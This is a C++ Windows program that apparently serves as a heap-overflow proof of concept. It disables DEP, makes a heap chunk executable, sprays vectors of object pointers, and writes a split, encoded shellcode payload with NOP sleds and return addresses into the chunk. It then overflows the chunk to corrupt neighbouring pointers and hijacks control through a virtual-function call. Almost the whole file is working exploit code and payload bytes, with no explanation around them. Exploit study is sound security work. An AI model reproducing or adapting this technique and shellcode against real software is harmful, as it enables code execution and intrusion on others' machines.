#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <Winbase.h>
#include <memoryapi.h>

using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

class SomeObject {
public:
	void function1(){
	};
 
	virtual void virtualFunction(){
		printf("test\n");
	};
};

int main(int args, char ** argv){
	SetProcessDEPPolicy(0x00000002);
	int i;
	HANDLE hChunk;
	void * allocations[ALLOC_COUNT];
	SomeObject * objects[5];
	SomeObject * obj = new SomeObject();
	printf("SomeObject address : 0x%08p\n", obj);
	int vectorSize = 40;

	HANDLE defaultHeap = GetProcessHeap();

	for(i = 0; i < ALLOC_COUNT; i++){
	hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
	memset(hChunk, 'A', 0x190);

	allocations[i] = hChunk;

	printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
	}
	DWORD protectlength = 0x00000040;
	PDWORD heapstart = (DWORD *) allocations[0];
	PDWORD heapend = (DWORD *) allocations[2] + protectlength;
	VirtualProtect(heapstart, 0x1000, 0x40, heapend);
	HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[3]);

	vector<SomeObject*> v1(vectorSize, obj);
	vector<SomeObject*> v2(vectorSize, obj);
	vector<SomeObject*> v3(vectorSize, obj);
	vector<SomeObject*> v4(vectorSize, obj);
	vector<SomeObject*> v5(vectorSize, obj);
	vector<SomeObject*> v6(vectorSize, obj);
	vector<SomeObject*> v7(vectorSize, obj);
	vector<SomeObject*> v8(vectorSize, obj);
	vector<SomeObject*> v9(vectorSize, obj); 
	vector<SomeObject*> v10(vectorSize, obj);

	printf("vector : 0x%08p\n", (void*) &v1);
	printf("vector : 0x%08p\n", (void*) &v2);
	printf("vector : 0x%08p\n", (void*) &v3);
	printf("vector : 0x%08p\n", (void*) &v4);
	printf("vector : 0x%08p\n", (void*) &v5);
	printf("vector : 0x%08p\n", (void*) &v6);
	printf("vector : 0x%08p\n", (void*) &v7);
	printf("vector : 0x%08p\n", (void*) &v8);
	printf("vector : 0x%08p\n", (void*) &v9);
	printf("vector : 0x%08p\n", (void*) &v10);
	memset(allocations[2], 'A', 0x190);
	char * heapret = (char *) allocations[2];
	char heapret_chararray[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray = (uint32_t) heapret;
	char return_address_1[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char return_address_2[] = "\xCC\xCC\xCC\xCC";
	char return_address_3[] = "\xDD\xDD\xDD\xDD";
	char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	char * heapret_2 = (char *) allocations[2] + 4;
	char heapret_chararray_2[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_2 = (uint32_t) heapret_2;
	char * heapret_3 = (char *) allocations[2] + 8;
	char heapret_chararray_3[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_3 = (uint32_t) heapret_3;
	char * heapret_4 = (char *) allocations[2] + 16;
	char heapret_chararray_4[5] = {"\x90\x90\x90\x90"};
	*(uint32_t*)heapret_chararray_4 = (uint32_t) heapret_4;
	char * ret_1 = heapret_chararray;
	char * ret_2 = heapret_chararray_2;
	char * ret_3 = heapret_chararray_3;
	char * ret_4 = heapret_chararray_4;
	char shellcode_1[14] = "\xdb\xce\xbf\x90\x28\x2f\x09\xd9\x74\x24\xf4\x5d\x29";
	char shellcode_2[14] = "\xc9\xb1\x31\x31\x7d\x18\x83\xc5\x04\x03\x7d\x84\xca";
	char shellcode_3[14] = "\xda\xf5\x4c\x88\x25\x06\x8c\xed\xac\xe3\xbd\x2d\xca";
	char shellcode_4[14] = "\x60\xed\x9d\x98\x25\x01\x55\xcc\xdd\x92\x1b\xd9\xd2";
	char shellcode_5[14] = "\x13\x91\x3f\xdc\xa4\x8a\x7c\x7f\x26\xd1\x50\x5f\x17";
	char shellcode_6[14] = "\x1a\xa5\x9e\x50\x47\x44\xf2\x09\x03\xfb\xe3\x3e\x59";
	char shellcode_7[14] = "\xc0\x88\x0c\x4f\x40\x6c\xc4\x6e\x61\x23\x5f\x29\xa1";
	char shellcode_8[14] = "\xc5\x8c\x41\xe8\xdd\xd1\x6c\xa2\x56\x21\x1a\x35\xbf";
	char shellcode_9[14] = "\x78\xe3\x9a\xfe\xb5\x16\xe2\xc7\x71\xc9\x91\x31\x82";
	char shellcode_10[14] = "\x74\xa2\x85\xf9\xa2\x27\x1e\x59\x20\x9f\xfa\x58\xe5";
	char shellcode_11[14] = "\x46\x88\x56\x42\x0c\xd6\x7a\x55\xc1\x6c\x86\xde\xe4";
	char shellcode_12[14] = "\xa2\x0f\xa4\xc2\x66\x54\x7e\x6a\x3e\x30\xd1\x93\x20";
	char shellcode_13[14] = "\x9b\x8e\x31\x2a\x31\xda\x4b\x71\x5f\x1d\xd9\x0f\x2d";
	char shellcode_14[14] = "\x1d\xe1\x0f\x01\x76\xd0\x84\xce\x01\xed\x4e\xab\xee";
	char shellcode_15[14] = "\x0f\x5b\xc1\x86\x89\x0e\x68\xcb\x29\xe5\xae\xf2\xa9";
	char shellcode_16[14] = "\x0c\x4e\x01\xb1\x64\x4b\x4d\x75\x94\x21\xde\x10\x9a";
	char shellcode_17[13] = "\x96\xdf\x30\xf9\x79\x4c\xd8\xd0\x1c\xf4\x7b\x2d";
	// EAX OFFSET = 24
	// EDX offset = 28
	memmove((char *) allocations[2], ret_2, 0x4);
	memmove((char *) allocations[2] + 4, ret_3, 0x4);
	memmove((char *) allocations[2] + 8, ret_4, 0x4);
	memmove((char *) allocations[2] + 16, shellcode_1, 0xC);
	memmove((char *) allocations[2] + 29, shellcode_2, 0xC);
	memmove((char *) allocations[2] + 42, shellcode_3, 0xC);
	memmove((char *) allocations[2] + 55, shellcode_4, 0xC);
	memmove((char *) allocations[2] + 68, shellcode_5, 0xC);
	memmove((char *) allocations[2] + 81, shellcode_6, 0xC);
	memmove((char *) allocations[2] + 94, shellcode_7, 0xC);
	memmove((char *) allocations[2] + 107, shellcode_8, 0xC);
	memmove((char *) allocations[2] + 120, shellcode_9, 0xC);
	memmove((char *) allocations[2] + 133, shellcode_10, 0xC);
	memmove((char *) allocations[2] + 146, shellcode_11, 0xC);
	memmove((char *) allocations[2] + 159, shellcode_12, 0xC);
	memmove((char *) allocations[2] + 172, shellcode_13, 0xC);
	memmove((char *) allocations[2] + 185, shellcode_14, 0xC);
	memmove((char *) allocations[2] + 198, shellcode_15, 0xC);
	memmove((char *) allocations[2] + 211, shellcode_16, 0xC);
	memmove((char *) allocations[2] + 224, shellcode_17, 0xB);

	memset((char *) allocations[2] + 237, '\xCC', 0xA3);
	memmove((char *) allocations[2] + 400, return_address_1, 0x18);
	//memmove((char *) allocations[2] + 424, payload, 0x18);
	memmove((char *) allocations[2] + 424, (char *) allocations[2], 0x4);
	memmove((char *) allocations[2] + 428, (char *) allocations[2], 0x4);
	memset((char *) allocations[2] + 432, 'A', 0x1000);
	//memset(allocations[2], 'B', CHUNK_SIZE + 8 + 32);
	v1.at(0)->virtualFunction();
	system("PAUSE");

	return 0;
}